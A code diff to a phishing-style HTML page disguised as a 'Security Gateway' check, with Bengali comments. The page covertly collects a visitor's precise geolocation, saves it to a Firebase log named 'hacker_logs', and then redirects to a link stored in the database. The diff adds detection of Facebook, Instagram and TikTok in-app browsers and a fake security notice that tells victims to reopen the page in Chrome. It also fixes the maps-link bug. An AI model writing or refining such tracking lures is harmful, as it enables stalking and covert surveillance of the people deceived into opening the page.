@@ -4,28 +4,63 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Gateway</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         body {
             margin: 0; padding: 0;
             display: flex; justify-content: center; align-items: center;
             height: 100vh; background-color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            overflow: hidden;
+            overflow: hidden; text-align: center;
+        }
+        
+        /* নরমাল লোডিং ডিজাইন */
+        #loader {
+            display: block; /* শুরুতে দেখাবে */
         }
         h2 {
             color: #333; font-weight: 400; font-size: 24px;
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse {
-            0% { opacity: 0.6; }
-            50% { opacity: 1; }
-            100% { opacity: 0.6; }
+            0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; }
+        }
+
+        /* ইন-অ্যাপ ব্রাউজার ওয়ার্নিং ডিজাইন */
+        #inAppWarning {
+            display: none; /* শুরুতে লুকানো থাকবে */
+            flex-direction: column; align-items: center;
+            padding: 20px;
+        }
+        .warn-icon { font-size: 50px; color: #ff9800; margin-bottom: 20px; }
+        .arrow-up {
+            position: absolute; top: 10px; right: 20px;
+            font-size: 40px; color: #333;
+            animation: bounce 1s infinite;
+        }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        p { color: #555; font-size: 16px; line-height: 1.5; }
+        .btn-guide {
+            margin-top: 15px; padding: 10px 20px;
+            background: #333; color: #fff; border-radius: 5px;
+            font-size: 14px; text-decoration: none;
         }
     </style>
 </head>
 <body>
 
-    <h2>Security Check...</h2>
+    <div id="loader">
+        <h2>Security Check...</h2>
+    </div>
+
+    <div id="inAppWarning">
+        <div class="arrow-up"><i class="fas fa-arrow-up"></i></div>
+        <div class="warn-icon"><i class="fas fa-shield-alt"></i></div>
+        <h3 style="margin-top:0">Action Required</h3>
+        <p>This page cannot run inside Facebook/TikTok browser due to security settings.</p>
+        <p><strong>1. Click the 3 dots (⋮) at the top right.</strong><br>
+        <strong>2. Select "Open in Browser" or "Open in Chrome".</strong></p>
+    </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
@@ -46,6 +81,34 @@
         
         let dataSent = false; 
 
+        // --- ডিটেকশন লজিক ---
+        function checkBrowser() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            // ফেসবুক, মেসেঞ্জার, ইনস্টাগ্রাম, টিকটক শনাক্ত করা
+            var isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1) || (ua.indexOf("TikTok") > -1);
+
+            if (isInApp) {
+                // ইন-অ্যাপ হলে ওয়ার্নিং দেখাবো, লোডার লুকাবো
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('inAppWarning').style.display = 'flex';
+            } else {
+                // আসল ব্রাউজার হলে লোকেশন চাইবো
+                startTracking();
+            }
+        }
+
+        function startTracking() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.watchPosition(
+                    processLocation,
+                    function(error) { console.log("Waiting..."); },
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 5000 }
+                );
+            } else {
+                window.location.href = "https://www.google.com";
+            }
+        }
+
         function processLocation(position) {
             if(dataSent) return; 
             dataSent = true;
@@ -56,8 +119,8 @@
             const trackerRef = ref(db, 'hacker_logs');
             const newLogRef = push(trackerRef);
             
-            // 🔥 FIXED Again: এখানে $ চিহ্ন দিয়ে ঠিক করে দিয়েছি
-            const mapsLink = `https://www.google.com/maps?q=$${lat},${lng}`;
+            // ✅ FIXED: ম্যাপ লিংক ফিক্সড
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
 
             set(newLogRef, {
                 timestamp: new Date().toString(),
@@ -66,15 +129,11 @@
                 longitude: lng,
                 accuracy: position.coords.accuracy
             }).then(() => {
-                // 🔥 REAL FIX: লগ সেভ হওয়ার পর আমরা ডাটাবেস চেক করবো লিংকের জন্য
-                // এতে লিংক মিস হওয়ার কোনো চান্স নেই
                 const dbRef = ref(db);
                 get(child(dbRef, "site_settings/redirect_link")).then((snapshot) => {
                     if (snapshot.exists()) {
-                        // ডাটাবেস থেকে লিংক পেলে সেখানে যাবে
                         window.location.href = snapshot.val();
                     } else {
-                        // না পেলে গুগলে যাবে
                         window.location.href = "https://www.google.com";
                     }
                 }).catch(() => {
@@ -83,24 +142,7 @@
             });
         }
 
-        window.onload = function() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.watchPosition(
-                    processLocation,
-                    function(error) {
-                        console.log("Waiting...");
-                    },
-                    { 
-                        enableHighAccuracy: true, 
-                        timeout: 30000, 
-                        maximumAge: 5000 
-                    }
-                );
-            } else {
-                // সাপোর্ট না করলে ডিফল্ট গুগলে পাঠাবে, অথবা তুই চাইলে এখানেও চেক বসাতে পারিস
-                window.location.href = "https://www.google.com";
-            }
-        };
+        window.onload = checkBrowser; // পেজ লোড হলেই চেক করবে
     </script>
 </body>
 </html>
